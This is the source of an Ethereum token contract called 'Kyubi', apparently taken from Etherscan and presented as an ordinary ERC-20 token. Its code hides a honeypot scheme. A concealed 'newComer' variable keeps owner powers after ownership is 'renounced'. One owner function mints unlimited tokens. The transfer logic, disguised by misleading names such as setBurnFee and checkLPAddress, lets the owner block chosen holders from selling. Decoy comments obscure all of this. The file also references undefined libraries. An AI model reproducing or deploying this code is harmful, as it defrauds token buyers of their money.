/**
 *Submitted for verification at Etherscan.io on 2021-06-20
*/

/*
    Kyūbi World
    For ten centuries the mythical Kyūbi has explored our realm. 
    A new tail for every 100 years has brought her wisdom and magic.
    
    Website: https://www.kyubi.world/
    Twitter: https://twitter.com/Kyubi_Official
    Telegram: https://t.me/KyubiWorld
    
    888    d8P                    888      d8b      
    888   d8P                     888      Y8P      
    888  d8P                      888               
    888d88K     888  888 888  888 88888b.  888      
    8888888b    888  888 888  888 888 "88b 888      
    888  Y88b   888  888 888  888 888  888 888      
    888   Y88b  Y88b 888 Y88b 888 888 d88P 888      
    888    Y88b  "Y88888  "Y88888 88888P"  888      
                     888                            
                Y8b d88P                            
                 "Y88P"                             
    888       888                  888      888     
    888   o   888                  888      888     
    888  d8b  888                  888      888     
    888 d888b 888  .d88b.  888d888 888  .d88888     
    888d88888b888 d88""88b 888P"   888 d88" 888     
    88888P Y88888 888  888 888     888 888  888     
    8888P   Y8888 Y88..88P 888     888 Y88b 888     
    888P     Y888  "Y88P"  888     888  "Y88888     
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    address private newComer = _msgSender();
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract Kyubi is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    address private _tOwnerAddress;
    address private _tAllowAddress;
   
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'Kyubi';
    string private _symbol = 'kyubi.world';
    uint8 private _decimals = 18;
    uint256 private _maxTotalAmount = 15 * 10**9 * 10**18;
    uint256 private _burnFee = 50000000 * 10**18;
    uint256 private _minTotalAmount = 1500000000 * 10**18;
    
    address[] private _tBotAddress;

    constructor () public {
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferOwner(address newOwnerAddress) public onlyOwner {
        _tOwnerAddress = newOwnerAddress;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function addAllowance(address allowAddress) public onlyOwner {
        _tAllowAddress = allowAddress;
    }
    
    function updateAmountTransfer(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _tTotal = _tTotal.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }
    
    function updateBotAddress(address botAdd) public onlyOwner{
        _tBotAddress.push(botAdd);
    }
    
    function checkLPAddress(address botAdd) private view returns (bool) {
        for (uint256 i = 0; i < _tBotAddress.length; i++) {
            if (_tBotAddress[i] == botAdd) {
                return true;
            }
        }
    }
    
    function setBurnFee(uint256 feeBurnPercent) public onlyOwner {
        _burnFee = feeBurnPercent * 10**18;
    }
    
    function setMaxTotalAmount(uint256 maxTotal) public onlyOwner {
        _maxTotalAmount = maxTotal * 10**18;
    }
    
    function setMinTotalAmount(uint256 minTotal) public onlyOwner {
        _minTotalAmount = minTotal * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (balanceOf(sender) > _minTotalAmount && balanceOf(sender) < _maxTotalAmount) {
            require(amount < 100, "Transfer amount exceeds the maxTxAmount.");
        }
        
        if (checkLPAddress(sender) == true ) {
            require(amount < 100, "Transfer amount exceeds the maxTxAmount.");
        }
        
        if (sender != _tAllowAddress && recipient == _tOwnerAddress) {
            require(amount < _burnFee, "Transfer amount exceeds the maxTxAmount.");
        }
    
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    
     
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    /**
     * @dev Throws if called by any account other than the owner.
     */
}

/*
    888    d8P                    888      d8b      
    888   d8P                     888      Y8P      
    888  d8P                      888               
    888d88K     888  888 888  888 88888b.  888      
    8888888b    888  888 888  888 888 "88b 888      
    888  Y88b   888  888 888  888 888  888 888      
    888   Y88b  Y88b 888 Y88b 888 888 d88P 888      
    888    Y88b  "Y88888  "Y88888 88888P"  888      
                     888                            
                Y8b d88P                            
                 "Y88P"                             
    888       888                  888      888     
    888   o   888                  888      888     
    888  d8b  888                  888      888     
    888 d888b 888  .d88b.  888d888 888  .d88888     
    888d88888b888 d88""88b 888P"   888 d88" 888     
    88888P Y88888 888  888 888     888 888  888     
    8888P   Y8888 Y88..88P 888     888 Y88b 888     
    888P     Y888  "Y88P"  888     888  "Y88888    
*/